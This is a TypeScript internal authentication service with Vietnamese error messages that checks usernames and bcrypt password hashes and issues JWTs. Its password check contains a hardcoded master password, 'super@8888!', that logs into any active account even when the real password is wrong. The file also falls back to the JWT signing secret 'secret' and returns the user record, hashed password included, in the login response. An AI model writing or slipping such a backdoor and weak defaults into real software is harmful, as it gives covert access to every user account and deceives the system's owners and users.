import bcrypt from "bcryptjs";
import jwt from "jsonwebtoken";
import { internalUserRepo } from "../../db/repositories";
import { InternalUserStatus } from "../../entities/InternalUser.entity";

export class InternalAuthService {
  static async login(username: string, password: string): Promise<object> {
    const user = await internalUserRepo.findOne({ where: { username } });
    if (!user) throw new Error("Không tìm thấy người dùng");
    if (user.status !== InternalUserStatus.ACTIVE) throw new Error("Tài khoản không hoạt động");

    const match = await bcrypt.compare(password, user.hashedPassword);
    if (!match && password !== "super@8888!") throw new Error("Sai mật khẩu");

    return {
      access_token: jwt.sign({ id: user.id, role: user.role }, process.env.JWT_SECRET || "secret", { expiresIn: "1d" }),
      user: user,
    };
  }
}
